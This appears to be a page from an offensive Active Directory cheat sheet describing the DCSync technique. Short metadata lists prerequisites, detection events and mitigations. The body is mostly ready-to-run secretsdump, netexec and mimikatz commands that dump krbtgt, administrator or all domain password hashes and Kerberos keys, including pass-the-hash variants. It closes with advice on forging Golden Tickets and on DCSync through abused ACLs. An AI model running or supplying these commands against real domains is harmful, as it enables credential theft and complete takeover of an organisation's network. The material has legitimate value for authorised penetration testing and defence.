---
title: DCSync
category: AD / Credentials
order: 30
tags: [dcsync, replication, ntlm, krbtgt, secretsdump]
summary: >
  Abuse the directory-replication rights to ask a DC to replicate account
  secrets (NT hashes, Kerberos keys) — including krbtgt — as if you were another
  DC. The endgame of most domain compromises.
prerequisites:
  - An account with the replication rights DS-Replication-Get-Changes AND DS-Replication-Get-Changes-All (Domain Admins, Enterprise Admins, DCs — or granted via an ACL)
  - Network access to a DC ($dc_ip)
tools: [impacket (secretsdump), netexec, mimikatz]
detection:
  - Event 4662 with the replication GUIDs from a non-DC principal / host
  - DRSUAPI (GetNCChanges) from an unexpected source IP
mitigation:
  - Audit who holds Get-Changes-All; alert on replication from non-DCs
  - Tier-0 hygiene; rotate krbtgt twice if compromised
refs:
  - { label: "HackTricks — DCSync", url: "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync" }
---

## Replicate secrets

```sh
# a single high-value account
secretsdump.py $domain/$user:$password@$dc_ip -just-dc-user $domain_nb/krbtgt
# the whole domain (all users' hashes + Kerberos keys + history)
secretsdump.py $domain/$user:$password@$dc_ip -just-dc
```

```sh
# pass-the-hash and Kerberos variants
secretsdump.py -hashes :$nthash $domain/$user@$dc_ip -just-dc-user administrator
netexec smb $dc_ip -u $user -p $password --ntds        # local-admin/DCSync path
```

```powershell
# mimikatz on a domain-joined host
lsadump::dcsync /domain:$domain /user:krbtgt
```

## Why krbtgt

The `krbtgt` NT hash lets you forge **Golden Tickets** (arbitrary TGTs) — see
Persistence. Grab it, and you own Kerberos in the domain until krbtgt is
rotated (twice).

> ACL note: if BloodHound shows your principal has `DS-Replication-Get-Changes*`
> on the domain object (e.g. via `GenericAll`/`WriteDacl` you abused), you can
> DCSync directly — no DA membership needed.
